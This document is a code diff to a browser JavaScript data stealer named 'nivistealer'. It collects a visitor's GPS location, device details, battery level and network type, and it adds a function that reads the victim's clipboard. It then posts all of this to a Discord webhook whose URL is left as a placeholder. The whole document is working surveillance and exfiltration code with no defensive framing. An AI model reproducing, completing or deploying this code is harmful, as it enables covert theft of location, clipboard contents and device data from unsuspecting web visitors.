@@ -38,6 +38,7 @@ alert("Your Browser Does not support Gps");
 }
 var batter="";
 var networktype="";
+var clips="";
 if("getBattery" in navigator){
 navigator.getBattery().then(function(battery) {
 batter=battery.level*100+"%";
@@ -46,6 +47,18 @@ batter=battery.level*100+"%";
 if("connection" in navigator){
 networktype=navigator.connection.type;
 }
+async function getclips() {
+try {
+let victimtext = await navigator.clipboard.readText();
+clips=victimtext;
+} catch (error) {
+clips="Clipboard Permission Denied";
+}
+}
+getclips();
+
+
+
 function showPosition(position) {
 var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude
 sdrp(grak);
@@ -89,7 +102,7 @@ var request = new XMLHttpRequest();
 request.open("POST", "your discord webhook url");
 request.setRequestHeader('Content-type', 'application/json');
 var params = {
-content: ("> **DeviceGps  : **" + gpsr + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **DeviceLocalTime : **" + localtime + "\n"),
+content: ("> **DeviceGps  : **" + gpsr + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Battery  : **" + batter+"\> **ClipBoard  : **" + clips+ "> **Internet Connection Type  : **" + networktype+"\n> **DeviceLocalTime : **" + localtime + "\n"),
 username: "nivistealer",
 avatar_url: "https://dpwhatsapp.xyz/wp-content/uploads/2021/08/Anime-Girl-WhatsApp-DP.jpg"
 }
@@ -109,6 +122,7 @@ battery : batter,
 devicelang: devicelang,
 iscookieEnabled: iscookieEnabled,
 useragent: useragent,
+clipboard: clips,
 deviceram: deviceram,
 cpuThreads: cpuThreads,
 referurl: referurl,
